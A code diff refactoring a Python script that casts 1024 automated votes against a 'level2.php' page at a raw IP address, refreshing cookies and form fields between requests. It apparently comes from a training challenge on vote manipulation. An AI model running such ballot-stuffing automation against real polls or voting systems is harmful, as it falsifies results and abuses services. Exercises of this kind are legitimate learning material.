@@ -35,16 +35,17 @@ def cast_vote(url, cookie, payload):
     res = requests.post(url, data=payload, cookies=cookie, headers=header)
     return res
 
-hodor_cookie = {}
-hodor_payload = {
-    "holdthedoor": "Submit Query",
-    "id": "139"
-}
-endpoint = "http://158.69.76.135/level2.php"
+if __name__ == "__main__":
+    hodor_cookie = {}
+    hodor_payload = {
+        "holdthedoor": "Submit Query",
+        "id": "139"
+    }
+    ENDPOINT = "http://158.69.76.135/level2.php"
 
-get_initial_data(endpoint, hodor_cookie, hodor_payload)
+    get_initial_data(ENDPOINT, hodor_cookie, hodor_payload)
 
-for i in range(1024):
-    res = cast_vote(endpoint, hodor_cookie, hodor_payload)
-    print("Vote #{:d} casted".format(i))
-    update_cookie_and_payload(res, hodor_cookie, hodor_payload)
+    for i in range(1, 1025):
+        res = cast_vote(ENDPOINT, hodor_cookie, hodor_payload)
+        print("Vote #{:d} casted".format(i))
+        update_cookie_and_payload(res, hodor_cookie, hodor_payload)
